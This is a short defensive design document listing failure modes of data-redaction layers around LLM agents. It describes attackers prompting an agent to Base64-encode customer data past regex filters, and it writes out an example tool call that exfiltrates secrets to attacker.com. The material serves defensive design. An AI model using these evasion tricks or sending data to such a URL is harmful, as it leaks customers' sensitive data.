# Failure Modes

## The "Base64 Bypass"
**Failure:** The redaction boundary uses simple regex to search for credit card numbers. An attacker prompts the agent to encode the customer data into Base64 or Hex before outputting it.
**Consequence:** The regex fails to match the encoded string, and the sensitive data is successfully exfiltrated. Redaction boundaries must account for encoding and obfuscation.

## Context Destruction
**Failure:** The redaction tool aggressively scrubs all names and numbers, replacing them with identical `[REDACTED]` tags.
**Consequence:** The LLM loses the ability to reason about the data (e.g., it can't tell if two redacted names refer to the same person). The agent becomes functionally useless. Tokenization (using unique identifiers like `PERSON_1`) is required instead of destructive redaction.

## Fail-Open on Timeout
**Failure:** The NLP model used for Named Entity Recognition (NER) takes too long to process a massive retrieved document. To preserve user experience, the system fails open and sends the unredacted text to the LLM.
**Consequence:** A massive data breach occurs during a spike in traffic when the NER service is slow. Redaction must always fail closed.

## Side-Channel Exfiltration
**Failure:** The redaction boundary successfully scrubs the final output message. However, it fails to scan the parameters of a tool call.
**Consequence:** An attacker instructs the agent to pass the sensitive data as a URL parameter to a malicious `search_web(query="http://attacker.com/?data=SECRETS")` tool. Tool call arguments must be heavily scrutinized.
